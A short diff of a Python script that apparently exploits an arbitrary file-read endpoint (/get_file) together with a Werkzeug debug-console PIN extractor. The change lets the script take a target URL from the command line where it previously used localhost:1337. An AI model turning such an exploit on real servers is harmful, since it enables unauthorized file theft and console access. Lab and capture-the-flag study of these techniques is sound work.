@@ -2,8 +2,9 @@
 from wconsole_extractor import WConsoleExtractor
 import requests
 import re
+import sys
 
-url = 'http://localhost:1337'
+url = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:1337'
 
 def leak_function(filename) -> str:
     r = requests.post(f'{url}/get_file', data={'filename': filename})
